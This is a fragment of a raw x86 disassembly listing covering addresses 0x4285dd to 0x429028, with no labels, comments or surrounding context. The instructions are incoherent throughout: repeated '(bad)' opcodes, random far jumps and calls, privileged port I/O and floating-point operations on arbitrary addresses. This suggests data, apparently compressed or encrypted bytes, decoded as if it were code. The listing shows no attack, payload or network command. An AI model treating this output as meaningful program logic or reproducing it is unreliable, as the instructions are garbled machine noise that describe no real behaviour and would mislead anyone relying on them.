  4285dd:	test   DWORD PTR [esi+0x18],edx
  4285e0:	test   BYTE PTR [edi],0x7b
  4285e3:	dec    edx
  4285e4:	pop    eax
  4285e5:	lock jmp 0xec2f235d
  4285eb:	(bad)  
  4285ec:	out    0xef,al
  4285ee:	or     dh,0xde
  4285f1:	dec    ebp
  4285f2:	xchg   edx,eax
  4285f3:	push   es
  4285f4:	ror    BYTE PTR [ebx+0x38],cl
  4285f7:	cdq    
  4285f8:	jecxz  0x4285c3
  4285fa:	fldcw  WORD PTR [edi+0x16]
  4285fd:	out    0x95,al
  4285ff:	inc    esp
  428600:	cmp    esp,esp
  428602:	ret    0xa592
  428605:	(bad)  
  428606:	mov    gs,WORD PTR [eax+0xf]
  428609:	and    esi,eax
  42860b:	in     al,dx
  42860c:	fistp  QWORD PTR [edi+0x58c360da]
  428612:	call   0x6c09:0x3965bdf8
  428619:	scas   al,BYTE PTR es:[edi]
  42861a:	add    al,0x7e
  42861c:	xor    al,0x73
  42861e:	sbb    al,bh
  428620:	pmulhw mm6,QWORD PTR [ebx-0x37093679]
  428627:	cli    
  428628:	jp     0x4285f1
  42862a:	rcl    esi,1
  42862c:	es push ds
  42862e:	adc    cl,dl
  428630:	sar    ch,cl
  428632:	ins    BYTE PTR es:[edi],dx
  428633:	fimul  DWORD PTR [esi-0x2]
  428636:	fdivr  QWORD PTR [esi+eax*8+0x7f505319]
  42863d:	push   ss
  42863e:	fnsave [esi-0x76e25912]
  428644:	mov    esp,0xcb5b47ee
  428649:	inc    edi
  42864a:	mov    ecx,0x9c0e4792
  42864f:	fisttp WORD PTR [ecx+0x11a08a82]
  428655:	(bad)  
  428656:	jnp    0x428601
  428658:	mov    ds:0xa3059a62,al
  42865d:	std    
  42865e:	cdq    
  42865f:	in     al,dx
  428660:	mov    cs:0x10129ab5,al
  428666:	adc    BYTE PTR [ecx+0x2f17a4fd],dh
  42866c:	inc    ebp
  42866d:	pop    edi
  42866e:	fild   DWORD PTR [edi-0x7328f2fa]
  428674:	mov    al,0xaa
  428676:	mov    bh,0x7a
  428678:	or     ecx,DWORD PTR [eax]
  42867a:	pop    edi
  42867b:	rcl    DWORD PTR [ebx],cl
  42867d:	xchg   esi,eax
  42867e:	mov    ebp,0x30fd9c42
  428683:	adc    ebp,esp
  428685:	jge    0x42864c
  428687:	mov    ds:0xa6e25493,al
  42868c:	lahf   
  42868d:	out    0x7c,al
  42868f:	(bad)
  428692:	xchg   esi,eax
  428693:	fcmovu st,st(5)
  428695:	inc    DWORD PTR [ebx-0x24]
  428698:	das    
  428699:	push   es
  42869a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42869b:	jle    0x42867c
  42869d:	cli    
  42869e:	jge    0x42867c
  4286a0:	pavgw  mm0,QWORD PTR [edi-0xd]
  4286a4:	daa    
  4286a5:	test   al,0xe5
  4286a7:	mov    ebx,0xf044f74b
  4286ac:	push   es
  4286ad:	inc    esi
  4286ae:	out    0x92,eax
  4286b0:	dec    ebx
  4286b1:	rcl    BYTE PTR ds:0x3eb6,cl
	...
  428713:	add    BYTE PTR [eax],al
  428715:	add    BYTE PTR [esi+0x5b],dl
  428718:	xor    al,0x78
  42871a:	cmp    eax,0x967f5e7f
  42871f:	or     bh,BYTE PTR ss:[ecx-0x63f2c1fb]
  428726:	jmp    0x1:0x70001af
  42872d:	add    BYTE PTR [ebx-0x61],dh
  428730:	outs   dx,BYTE PTR ds:[esi]
  428731:	mov    ds:0x9c441573,al
  428736:	dec    eax
  428737:	dec    esi
  428738:	aas    
  428739:	dec    ecx
  42873a:	push   ss
  42873b:	sbb    bl,BYTE PTR [eax+0x62322271]
  428741:	pop    esi
  428742:	ud0    edx,ebp
  428745:	fdivr  DWORD PTR [edx+eiz*8]
  428748:	xor    DWORD PTR [edx+0x7b],ebx
  42874b:	fimul  WORD PTR [esi]
  42874d:	mov    al,0x63
  42874f:	push   ebx
  428750:	stos   BYTE PTR es:[edi],al
  428751:	push   DWORD PTR [esi+ebx*4+0x63]
  428755:	sub    BYTE PTR [ebx+edx*1+0x36],0x39
  42875a:	imul   esp,DWORD PTR [eax],0x677da64e
  428760:	(bad)  
  428761:	sub    eax,0x9cddfcb1
  428766:	imul   eax
  428768:	scas   eax,DWORD PTR es:[edi]
  428769:	adc    edi,DWORD PTR [ebx+0x7976ac]
  42876f:	cld    
  428770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428771:	cmp    ebp,esp
  428773:	cdq    
  428774:	adc    edx,esp
  428776:	pop    edx
  428777:	inc    esp
  428778:	cmp    eax,0x59d911a
  42877d:	jns    0x428735
  42877f:	icebp  
  428780:	add    BYTE PTR [ebp+esi*8-0xd],bl
  428784:	xor    dl,BYTE PTR [edi-0x10]
  428787:	fild   WORD PTR [esi+ebx*8+0x19]
  42878b:	in     al,dx
  42878c:	test   DWORD PTR [edx-0x1f],ebp
  42878f:	or     al,0xb5
  428791:	pusha  
  428792:	iret   
  428793:	shl    BYTE PTR [ebp+0x3c04d4dc],1
  428799:	sub    cl,ah
  42879b:	ret    
  42879c:	inc    ebp
  42879d:	jle    0x4287c4
  42879f:	or     ah,BYTE PTR [edi]
  4287a1:	mov    bh,0x8
  4287a3:	repnz and al,0x55
  4287a6:	and    al,BYTE PTR [eax-0x34]
  4287a9:	dec    edi
  4287aa:	dec    eax
  4287ab:	dec    eax
  4287ac:	add    BYTE PTR [ebx-0x2b1107d3],0xda
  4287b3:	sub    bh,BYTE PTR [ebp+0x1c]
  4287b6:	xchg   edx,eax
  4287b7:	mov    esi,0xfcaca142
  4287bc:	aam    0xfd
  4287be:	mov    BYTE PTR [eax],0x90
  4287c1:	adc    DWORD PTR [eax],0xaead1d76
  4287c7:	or     al,0x8
  4287c9:	test   DWORD PTR [edi],eax
  4287cb:	je     0x4287f0
  4287cd:	pop    ecx
  4287ce:	push   eax
  4287cf:	fwait
  4287d0:	rcr    BYTE PTR [eax],1
  4287d2:	dec    edx
  4287d3:	jmp    0x4287ec
  4287d5:	and    eax,DWORD PTR [eax+0x2da951fe]
  4287db:	cmp    edx,ebx
  4287dd:	xor    DWORD PTR [ebx+0xd],edi
  4287e0:	cs xchg esp,esp
  4287e3:	dec    ecx
  4287e4:	lea    ebx,[ecx+ebp*2+0x11]
  4287e8:	or     DWORD PTR [ebx+0x3],esi
  4287eb:	jmp    0x54af:0x8d793399
  4287f2:	xchg   BYTE PTR [eax-0x3b],ch
  4287f5:	mov    ebp,0xe95dc1ff
  4287fa:	xchg   BYTE PTR ds:[ecx-0x5d],dl
  4287fe:	or     eax,0xd1ca9e95
  428803:	ins    BYTE PTR es:[edi],dx
  428804:	in     al,dx
  428805:	out    0x9f,al
  428807:	(bad)  
  428808:	out    dx,al
  428809:	push   ebx
  42880a:	inc    ebp
  42880b:	(bad)  
  42880c:	shl    BYTE PTR [edi+eiz*4],1
  42880f:	jmp    0x42888d
  428811:	jne    0x428848
  428813:	xchg   edx,eax
  428814:	sbb    dh,dh
  428816:	add    dh,dh
  428818:	adc    al,BYTE PTR [ecx+0x1a]
  42881b:	pusha  
  42881c:	mov    esi,0x46f4e1e0
  428821:	jne    0x42882b
  428823:	das    
  428824:	mov    bl,0xfa
  428826:	repz in eax,0xf
  428829:	int3   
  42882a:	pop    ebx
  42882b:	fidiv  WORD PTR [bp+0x11]
  42882f:	sub    BYTE PTR [edi],bl
  428831:	dec    edx
  428832:	data16 (bad) 
  428834:	sub    eax,0x0
	...
  428895:	add    BYTE PTR [esi],ah
  428897:	jp     0x42890a
  428899:	les    edi,FWORD PTR [ebp-0x31]
  42889c:	mov    bh,0xfa
  42889e:	ret    
  42889f:	ja     0x428848
  4288a1:	test   DWORD PTR [ebp-0x37],esi
  4288a4:	cld    
  4288a5:	or     dh,cl
  4288a7:	mov    al,0x1
  4288a9:	add    BYTE PTR [edi],al
  4288ab:	add    DWORD PTR [eax],eax
  4288ad:	add    BYTE PTR [eax+eiz*4-0x7a4deac9],al
  4288b4:	cmp    al,0x3e
  4288b6:	xchg   esi,eax
  4288b7:	mov    bh,0x46
  4288b9:	outs   dx,BYTE PTR ds:[esi]
  4288ba:	pop    esi
  4288bb:	cmp    edx,DWORD PTR [ebp+0x4c]
  4288be:	lea    eax,[edx+ecx*4+0x68]
  4288c2:	iret   
  4288c3:	pop    esi
  4288c4:	scas   eax,DWORD PTR es:[edi]
  4288c5:	push   ecx
  4288c6:	jae    0x428942
  4288c8:	jb     0x428889
  4288ca:	jbe    0x4288c1
  4288cc:	or     BYTE PTR [ebx],bh
  4288ce:	ficomp WORD PTR [esi-0x4e3c0391]
  4288d4:	mov    cl,0xfa
  4288d6:	loope  0x428882
  4288d8:	sbb    eax,edx
  4288da:	add    DWORD PTR [edx],ecx
  4288dc:	add    eax,0xce0477be
  4288e1:	in     al,dx
  4288e2:	sub    ah,BYTE PTR [eax-0x62]
  4288e5:	adc    eax,0xd9c9a5bc
  4288ea:	stos   BYTE PTR es:[edi],al
  4288eb:	lahf   
  4288ec:	sbb    DWORD PTR [edx+0x48],ebp
  4288ef:	test   DWORD PTR ds:0x51f86a82,0x1b1914e3
  4288f9:	xchg   esi,eax
  4288fa:	add    BYTE PTR [ecx],ah
  4288fc:	das    
  4288fd:	mov    ebp,0xe22048dd
  428902:	jno    0x4288fe
  428904:	jno    0x4288da
  428906:	push   ss
  428907:	dec    ecx
  428908:	jl     0x42889b
  42890a:	ja     0x42893a
  42890c:	mov    ds:0xae98b632,al
  428911:	scas   eax,DWORD PTR es:[edi]
  428912:	jno    0x4288e9
  428914:	cmp    al,0xae
  428916:	or     eax,0x6229880c
  42891b:	call   0x150b39bf
  428920:	ins    DWORD PTR es:[edi],dx
  428921:	sbb    DWORD PTR [ebx-0x5c],ebx
  428924:	inc    eax
  428925:	pop    ebx
  428926:	clc    
  428927:	and    eax,0x406a136
  42892c:	out    dx,al
  42892d:	pop    es
  42892e:	push   ecx
  42892f:	mov    dh,0xcd
  428931:	dec    eax
  428932:	lock sbb edi,ebp
  428935:	adc    eax,0x846e02a8
  42893a:	out    0x59,al
  42893c:	mov    ds:0xcafa9f48,eax
  428941:	or     eax,0x28c0a63d
  428946:	fimul  DWORD PTR [eax+0x30]
  428949:	in     al,0x4a
  42894b:	xor    BYTE PTR [edx-0x6221e411],dh
  428951:	clc    
  428952:	jns    0x428957
  428954:	aam    0x2e
  428956:	pop    eax
  428957:	jb     0x428912
  428959:	je     0x42895d
  42895b:	xchg   edi,eax
  42895c:	push   ebp
  42895d:	ficomp WORD PTR [ebx-0x55]
  428960:	pop    eax
  428961:	xchg   ebp,eax
  428962:	mov    ss,ecx
  428964:	jecxz  0x4289c2
  428966:	xchg   ebp,eax
  428967:	leave  
  428968:	call   0x74b26919
  42896d:	rcl    DWORD PTR [ebx-0x660cacb4],0xed
  428974:	and    BYTE PTR [eax+0x538dce2b],bh
  42897a:	int3   
  42897b:	imul   esp,DWORD PTR [edx+0x3394924e],0xffffffd8
  428982:	and    esp,DWORD PTR [esi-0x7]
  428985:	retf   0xc3d9
  428988:	lea    ebx,[ecx-0x2309c4a1]
  42898e:	test   dl,dl
  428990:	fnsave [edx+0x18a6179]
  428996:	cli    
  428997:	retf   0x9476
  42899a:	setnp  BYTE PTR [esi+0x324787c9]
  4289a1:	pop    ecx
  4289a2:	lods   al,BYTE PTR ds:[esi]
  4289a3:	scas   eax,DWORD PTR es:[edi]
  4289a4:	js     0x42895f
  4289a6:	fmul   DWORD PTR [ebx+ecx*2-0x6c]
  4289aa:	hlt    
  4289ab:	jecxz  0x428a18
  4289ad:	dec    eax
  4289ae:	(bad)  
  4289af:	sti    
  4289b0:	adc    BYTE PTR ds:0xd3b4ae,dl
	...
  428a16:	dec    ebp
  428a17:	or     al,0xf8
  428a19:	pop    ebx
  428a1a:	stc    
  428a1b:	(bad)  
  428a1c:	out    dx,eax
  428a1d:	push   ds
  428a1e:	push   ss
  428a1f:	xchg   edx,eax
  428a20:	data16 aas 
  428a22:	and    BYTE PTR [esi-0x4e076184],al
  428a28:	add    DWORD PTR [eax],eax
  428a2a:	pop    es
  428a2b:	add    DWORD PTR [eax],eax
  428a2d:	add    BYTE PTR [edi+0x2ee3ef6f],dl
  428a33:	sub    esp,DWORD PTR [esi-0x7d]
  428a36:	lock pop ds
  428a38:	cld    
  428a39:	inc    esp
  428a3a:	sub    dh,BYTE PTR [edx-0x17]
  428a3d:	or     edi,DWORD PTR [esi]
  428a3f:	cs mov edx,0xe066e5a1
  428a45:	or     BYTE PTR [esi],ch
  428a47:	in     al,0x81
  428a49:	cmp    ebx,edx
  428a4b:	das    
  428a4c:	mov    eax,ds:0x1806940c
  428a51:	out    dx,al
  428a52:	mov    esp,0xce0335ff
  428a57:	nop
  428a58:	mov    ebx,0xda29e4dd
  428a5d:	adc    al,BYTE PTR [eax-0x70]
  428a60:	js     0x428a70
  428a62:	xchg   esp,eax
  428a63:	and    eax,0xab14fd5
  428a68:	mov    cl,0x59
  428a6a:	sbb    eax,DWORD PTR [ecx]
  428a6c:	and    eax,0x1ee29a92
  428a71:	bound  ebx,QWORD PTR [edx]
  428a73:	loopne 0x428acb
  428a75:	scas   al,BYTE PTR es:[edi]
  428a76:	not    BYTE PTR [esi+eiz*4+0x2d966d48]
  428a7d:	dec    esp
  428a7e:	popa   
  428a7f:	dec    eax
  428a80:	sbb    ebp,DWORD PTR [edi+eiz*1+0x34f57270]
  428a87:	mov    bh,0x25
  428a89:	sub    al,BYTE PTR [edi-0x6e7406f8]
  428a8f:	leave  
  428a90:	inc    ebp
  428a91:	jno    0x428a4f
  428a93:	clc    
  428a94:	pop    ss
  428a95:	mov    eax,0xa04fcfee
  428a9a:	inc    esp
  428a9b:	adc    DWORD PTR [edx+esi*2],ebx
  428a9e:	aas    
  428a9f:	mov    BYTE PTR [ebp-0x4],ah
  428aa2:	(bad)  
  428aa3:	jae    0x428a79
  428aa5:	push   eax
  428aa6:	je     0x428a94
  428aa8:	out    dx,al
  428aa9:	pop    edx
  428aaa:	push   cs
  428aab:	inc    edx
  428aac:	pop    edi
  428aad:	enter  0xb30e,0x4b
  428ab1:	or     bl,BYTE PTR [ebp-0x37c05dac]
  428ab7:	jg     0x428a6c
  428ab9:	or     eax,0x91815cf5
  428abe:	mov    DWORD PTR [esi+0x30ba8a1e],edi
  428ac4:	jno    0x428af5
  428ac6:	call   0x51a343f
  428acb:	and    al,0x89
  428acd:	stc    
  428ace:	outs   dx,DWORD PTR ds:[esi]
  428acf:	inc    eax
  428ad0:	push   ebp
  428ad1:	in     al,0xc2
  428ad3:	pop    ebp
  428ad4:	imul   eax,DWORD PTR [esi],0x78
  428ad7:	cli    
  428ad8:	test   BYTE PTR [edi],0x68
  428adb:	cmp    DWORD PTR [ebx-0x25],esp
  428ade:	les    ebx,FWORD PTR [ebx]
  428ae0:	int    0x85
  428ae2:	ds mov edi,0x1b5994f9
  428ae8:	fsub   st,st(4)
  428aea:	outs   dx,DWORD PTR ds:[esi]
  428aeb:	xor    eax,0x6e8fd211
  428af0:	retf   0x7af4
  428af3:	aas    
  428af4:	(bad)  
  428af5:	mov    BYTE PTR [edi+ebx*4+0x745856f2],dl
  428afc:	mov    BYTE PTR [ebx+edx*1-0xc],dh
  428b00:	fwait
  428b01:	out    dx,eax
  428b02:	add    dl,BYTE PTR [ebx-0x55466e6d]
  428b08:	loop   0x428b4a
  428b0a:	cdq    
  428b0b:	ss iret 
  428b0d:	hlt    
  428b0e:	mov    ds:0x295bad48,eax
  428b13:	fsub   QWORD PTR [edi]
  428b15:	adc    DWORD PTR [eax-0x68],edx
  428b18:	push   es
  428b19:	imul   ebx,DWORD PTR [ebp-0x3],0xa0a70ed6
  428b20:	and    DWORD PTR [edi+0x6d117852],esp
  428b26:	loope  0x428af8
  428b28:	and    DWORD PTR [ebx+ebx*8+0x706d784a],edx
  428b2f:	div    BYTE PTR [ebx+0x7fb095c7]
	...
  428b95:	add    ch,al
  428b97:	push   ebp
  428b98:	mov    bh,dl
  428b9a:	call   0x5fb1:0xb77ff5ff
  428ba1:	test   eax,0xe2c5dd18
  428ba6:	push   DWORD PTR [edx+0x1070001]
  428bac:	add    BYTE PTR [eax],al
  428bae:	fnstsw WORD PTR ds:0xe0167ac0
  428bb4:	cld    
  428bb5:	push   ax
  428bb7:	jl     0x428b4a
  428bb9:	loope  0x428c21
  428bbb:	xor    BYTE PTR [esi+0x6d],cl
  428bbe:	daa    
  428bbf:	or     BYTE PTR [edx+0x14],bl
  428bc2:	ds stos BYTE PTR es:[edi],al
  428bc4:	aam    0xda
  428bc6:	pop    ecx
  428bc7:	jecxz  0x428b4d
  428bc9:	push   cs
  428bca:	enter  0x334c,0xc
  428bce:	dec    eax
  428bcf:	add    DWORD PTR [ebx],eax
  428bd1:	xor    edx,DWORD PTR [ecx+eax*8-0x1c722427]
  428bd8:	adc    DWORD PTR [ebp-0x13],ebx
  428bdb:	mov    bh,0x9b
  428bdd:	test   BYTE PTR [ebp-0x6d],0xcc
  428be1:	call   0x2bcb:0x9a41615
  428be8:	dec    ebp
  428be9:	daa    
  428bea:	sub    eax,0x603e28ac
  428bef:	fisubr DWORD PTR [eax]
  428bf1:	pop    esp
  428bf2:	pop    edx
  428bf3:	jne    0x428c25
  428bf5:	outs   dx,BYTE PTR ds:[esi]
  428bf6:	popf   
  428bf7:	jecxz  0x428bb3
  428bf9:	xchg   ch,al
  428bfb:	mov    DWORD PTR ds:[ebx-0x56dd278e],edx
  428c02:	pop    esp
  428c03:	xlat   BYTE PTR ds:[ebx]
  428c04:	mov    edi,0xe9edf87b
  428c09:	in     eax,0x1e
  428c0b:	mov    al,0xbb
  428c0d:	dec    eax
  428c0e:	adc    esp,esp
  428c10:	gs inc ebx
  428c12:	(bad)  
  428c13:	and    DWORD PTR ds:[edx-0x5eb223fa],esp
  428c1a:	test   BYTE PTR [edx-0x2e],ah
  428c1d:	fdivrp st(3),st
  428c1f:	add    DWORD PTR [edx],ecx
  428c21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428c22:	mov    dl,0xac
  428c24:	and    DWORD PTR [edx],esi
  428c26:	mov    BYTE PTR [edi+0x490827eb],al
  428c2c:	jae    0x428c1e
  428c2e:	ins    BYTE PTR es:[edi],dx
  428c2f:	nop
  428c30:	fwait
  428c31:	mov    ah,0xc9
  428c33:	les    ebp,FWORD PTR [eax+0x66fe6190]
  428c39:	jmp    0x89dc:0x47f82d3f
  428c40:	add    BYTE PTR [di+0x23],0xb1
  428c45:	dec    ebx
  428c46:	dec    esi
  428c47:	jmp    0x428c4f
  428c49:	sti    
  428c4a:	lods   al,BYTE PTR ds:[esi]
  428c4b:	xchg   ebp,eax
  428c4c:	pop    edx
  428c4d:	cmp    bh,0x28
  428c50:	xchg   esp,eax
  428c51:	adc    ebx,DWORD PTR [ebp+edx*8+0x6920981b]
  428c58:	cmp    dl,BYTE PTR [ecx+0x79]
  428c5b:	ins    BYTE PTR es:[edi],dx
  428c5c:	cmp    eax,0x8f9bb3f4
  428c61:	jmp    0x428cd2
  428c63:	pop    edx
  428c64:	(bad)  
  428c65:	sub    edx,ebx
  428c67:	call   0xc310:0xc84ce751
  428c6e:	lds    eax,FWORD PTR [edx]
  428c70:	pushf  
  428c71:	ins    DWORD PTR es:[edi],dx
  428c72:	push   0x61
  428c74:	pushf  
  428c75:	call   0xa96a2bf6
  428c7a:	xor    cl,BYTE PTR [eax-0x68bf05b9]
  428c80:	pop    ds
  428c81:	out    0xce,al
  428c83:	mov    ds:0x1bcca3cd,eax
  428c88:	es fwait
  428c8a:	nop
  428c8b:	lahf   
  428c8c:	jmp    0x4ee9:0x26cd0ec4
  428c93:	push   ecx
  428c94:	pop    esi
  428c95:	hlt    
  428c96:	fs test edi,esp
  428c99:	mov    WORD PTR [ebx-0x6a],gs
  428c9c:	inc    ebx
  428c9d:	pop    esi
  428c9e:	dec    ebp
  428c9f:	jmp    0x9625119f
  428ca4:	ficomp WORD PTR [ecx]
  428ca6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428ca7:	sbb    al,0x4
  428ca9:	es loope 0x428cda
  428cac:	(bad)  
  428cad:	fst    QWORD PTR [edi]
  428caf:	jo     0x428cb5
  428cb1:	sub    BYTE PTR [edx],dh
  428cb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428cb4:	push   esp
	...
  428d15:	add    BYTE PTR [ecx-0xace0e4b],al
  428d1b:	jne    0x428cde
  428d1d:	mov    ch,0x86
  428d1f:	xchg   esi,eax
  428d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d21:	jns    0x428d1a
  428d23:	scas   al,BYTE PTR es:[edi]
  428d24:	inc    edx
  428d25:	inc    ecx
  428d26:	push   es
  428d27:	mov    ah,0x1
  428d29:	add    BYTE PTR [edi],al
  428d2b:	add    DWORD PTR [eax],eax
  428d2d:	add    BYTE PTR [edx+eax*4],bh
  428d30:	adc    bl,al
  428d32:	icebp  
  428d33:	cmp    eax,0x5401c767
  428d38:	cs ret 0x461f
  428d3c:	mov    edx,DWORD PTR [edi+0x62]
  428d3f:	cwde   
  428d40:	outs   dx,DWORD PTR ds:[esi]
  428d41:	sti    
  428d42:	fnsave [ebp+0x71]
  428d45:	fimul  DWORD PTR [esi]
  428d47:	and    eax,0xe6ab9971
  428d4c:	js     0x428d6d
  428d4e:	sub    ch,cl
  428d50:	lods   al,BYTE PTR ds:[esi]
  428d51:	lods   al,BYTE PTR ds:[si]
  428d53:	sbb    DWORD PTR [edi+0x75],eax
  428d56:	xchg   DWORD PTR [eax+esi*8+0x432a3e79],ebp
  428d5d:	jmp    0x533b6839
  428d62:	lahf   
  428d63:	and    ecx,DWORD PTR [ebx+0x70f10b85]
  428d69:	mov    edi,0xdd811c62
  428d6e:	enter  0x5f7a,0x72
  428d72:	mov    BYTE PTR [esi-0x8c5a7a9],cl
  428d78:	cmp    ch,BYTE PTR [edx]
  428d7a:	mov    bh,0xd8
  428d7c:	add    ebp,esi
  428d7e:	sub    edi,DWORD PTR [edi+ebp*1]
  428d81:	add    BYTE PTR [eax+0x34],dl
  428d84:	pop    edi
  428d85:	int3   
  428d86:	pop    ss
  428d87:	mov    esi,0x8dbc1f45
  428d8c:	and    al,0x95
  428d8e:	push   edx
  428d8f:	out    dx,eax
  428d90:	push   esp
  428d91:	pop    eax
  428d92:	icebp  
  428d93:	dec    edx
  428d94:	pop    esp
  428d95:	sub    eax,0x44e370a8
  428d9a:	add    DWORD PTR [edi],0x71
  428d9d:	inc    ecx
  428d9e:	nop
  428d9f:	adc    ch,BYTE PTR [ebx+0x29f96796]
  428da5:	outs   dx,BYTE PTR ds:[esi]
  428da6:	sbb    al,0x58
  428da8:	daa    
  428da9:	mov    BYTE PTR [ebp-0x23],ah
  428dac:	popa   
  428dad:	outs   dx,DWORD PTR ds:[esi]
  428dae:	cdq    
  428daf:	inc    edi
  428db0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428db1:	ret    0xf9e
  428db4:	pop    ecx
  428db5:	test   al,0x2d
  428db7:	aad    0xcb
  428db9:	and    eax,0x72ec7f8a
  428dbe:	data16 aas 
  428dc0:	ins    DWORD PTR es:[edi],dx
  428dc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428dc2:	(bad)  
  428dc3:	xchg   esp,eax
  428dc4:	sbb    al,0x1f
  428dc6:	test   BYTE PTR [ebp-0x6f],dh
  428dc9:	add    eax,0x7d42fe3d
  428dce:	mov    ch,0x39
  428dd0:	dec    ecx
  428dd1:	mov    ds:0xa8a08fe7,al
  428dd6:	mov    ebx,0xc46dca98
  428ddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ddc:	mov    ebp,0xce8d98f
  428de1:	xor    al,0x57
  428de3:	(bad)  
  428de4:	paddw  mm3,QWORD PTR [esi+esi*1+0x2b]
  428de9:	dec    ecx
  428dea:	sbb    al,0xff
  428dec:	fsubr  st,st(6)
  428dee:	sbb    BYTE PTR [ecx+0x17d1e65e],ah
  428df4:	xchg   ebx,eax
  428df5:	mov    ds:0x31d206d0,al
  428dfa:	mov    al,0x45
  428dfc:	(bad)  
  428dfd:	fimul  DWORD PTR [eax]
  428dff:	xchg   esp,eax
  428e00:	imul   ebx,DWORD PTR [esi+0x4f1582d],0x5b265465
  428e0a:	or     al,0x15
  428e0c:	(bad)  
  428e0d:	add    DWORD PTR [ebx+0x30],edx
  428e10:	lahf   
  428e11:	inc    esi
  428e12:	mov    esi,0xaa25c031
  428e17:	push   esi
  428e18:	aad    0x89
  428e1a:	stc    
  428e1b:	ret    
  428e1c:	inc    esi
  428e1d:	(bad)
  428e20:	fwait
  428e21:	rol    DWORD PTR [edx],1
  428e23:	inc    edi
  428e24:	in     eax,0xff
  428e26:	aad    0xd9
  428e28:	dec    ebp
  428e29:	or     dl,dl
  428e2b:	xor    dl,ah
  428e2d:	cmc    
  428e2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e2f:	ins    DWORD PTR es:[edi],dx
  428e30:	xor    dh,BYTE PTR [esi+0xa05fe7]
	...
  428e96:	dec    edi
  428e97:	pop    ebp
  428e98:	pop    ecx
  428e99:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428e9d:	(bad)  
  428e9f:	cli    
  428ea0:	test   al,0xd9
  428ea2:	cmp    al,0x50
  428ea4:	or     DWORD PTR [ebp+ecx*1+0x70001b5],0x1
  428eac:	add    BYTE PTR [eax],al
  428eae:	fistp  QWORD PTR [ebx]
  428eb0:	fsubr  QWORD PTR [ebp+0x55]
  428eb3:	xor    al,0x70
  428eb5:	fwait
  428eb6:	jb     0x428ef4
  428eb8:	mov    edi,0x7f23b476
  428ebd:	adc    edx,esi
  428ebf:	jo     0x428f34
  428ec1:	pop    eax
  428ec2:	(bad)  
  428ec3:	mov    bl,0x82
  428ec5:	cld    
  428ec6:	cmp    ecx,DWORD PTR [eax-0xb3d3fe9]
  428ecc:	nop
  428ecd:	(bad)  
  428ece:	xor    DWORD PTR [ebx+0x7e31e194],ebp
  428ed4:	xor    eax,0x7da621c5
  428ed9:	inc    ecx
  428eda:	outs   dx,DWORD PTR ds:[esi]
  428edb:	out    dx,al
  428edc:	dec    eax
  428edd:	loop   0x428f26
  428edf:	sub    bh,dl
  428ee1:	sub    DWORD PTR [ecx],esp
  428ee3:	pop    bp
  428ee5:	cmp    DWORD PTR [ecx],esi
  428ee7:	mov    bh,BYTE PTR [eax+0x15]
  428eea:	mov    ah,0x5d
  428eec:	popa   
  428eed:	neg    BYTE PTR [eax-0x158d26ce]
  428ef3:	inc    esi
  428ef4:	je     0x428ead
  428ef6:	jle    0x428eb7
  428ef8:	xor    al,BYTE PTR [ecx+0x8bfee80]
  428efe:	or     BYTE PTR [edi-0xcc613d8],cl
  428f04:	inc    ebp
  428f05:	pop    ss
  428f06:	push   ebx
  428f07:	shr    DWORD PTR [ebx+0x5783ef65],0x64
  428f0e:	dec    edx
  428f0f:	out    0xd5,al
  428f11:	sbb    esp,DWORD PTR [ecx]
  428f13:	mov    edi,DWORD PTR [ebx-0x44]
  428f16:	js     0x428f58
  428f18:	std    
  428f19:	iret   
  428f1a:	int    0xfe
  428f1c:	add    DWORD PTR [esi+ebx*2],0xffffffdf
  428f20:	icebp  
  428f21:	out    0x11,eax
  428f23:	xchg   ecx,eax
  428f24:	ret    
  428f25:	mov    ds:0xed0ca828,eax
  428f2a:	mov    ebx,0x6a290210
  428f2f:	add    eax,0xb4b5d5c6
  428f34:	inc    eax
  428f35:	xor    esp,DWORD PTR [esp+edx*4]
  428f38:	push   edi
  428f39:	(bad)  
  428f3b:	xor    edx,DWORD PTR [edx+0x73]
  428f3e:	cmp    eax,0xa76cb65a
  428f43:	sub    DWORD PTR [eax+esi*8+0x2f62c68c],ebx
  428f4a:	push   eax
  428f4b:	imul   BYTE PTR [ebx+0x3c]
  428f4e:	push   es
  428f4f:	bound  edx,QWORD PTR [ebx]
  428f51:	push   0xffffff8a
  428f53:	inc    edx
  428f54:	lahf   
  428f55:	pop    ds
  428f56:	je     0x428f3a
  428f58:	retf   
  428f59:	bound  ebp,QWORD PTR [eax]
  428f5b:	push   es
  428f5c:	mov    WORD PTR [edi+0x7c],cs
  428f5f:	repnz sti 
  428f61:	loop   0x428fbc
  428f63:	add    BYTE PTR [ecx],al
  428f65:	and    ch,BYTE PTR [esi+0x77a3cdc]
  428f6b:	dec    ecx
  428f6c:	(bad)  
  428f6d:	cmp    cl,BYTE PTR [esi+0x29]
  428f70:	pop    ebp
  428f71:	in     eax,dx
  428f72:	xor    esi,eax
  428f74:	dec    DWORD PTR [esi+0x6937a307]
  428f7a:	dec    ecx
  428f7b:	jnp    0x428fab
  428f7d:	mov    eax,ds:0x18576815
  428f82:	daa    
  428f83:	mov    ecx,0xbac0e902
  428f88:	add    ah,dl
  428f8a:	xchg   ebp,eax
  428f8b:	addr16 mov ah,0xb1
  428f8e:	pop    edx
  428f8f:	andps  xmm1,XMMWORD PTR [edi*4+0xbdc5fe2]
  428f97:	jmp    0x3e3150e9
  428f9c:	push   esp
  428f9d:	mov    al,ds:0x6fac6a13
  428fa2:	cmp    eax,DWORD PTR [edi+0x4cb5d4a0]
  428fa8:	call   0x9a3a94bd
  428fad:	push   ss
  428fae:	add    bl,dl
  428fb0:	je     0x428f41
  428fb2:	fisub  DWORD PTR [bp+di+0x0]
	...
  429016:	loope  0x429004
  429018:	mov    ebx,es
  42901a:	(bad)  
  42901b:	jecxz  0x42900c
  42901d:	out    dx,al
  42901e:	arpl   WORD PTR [esi+0x79],cx
  429021:	sbb    DWORD PTR [esi+edi*8-0x49eb0729],ecx
  429028:	add    DWORD PTR [eax],eax
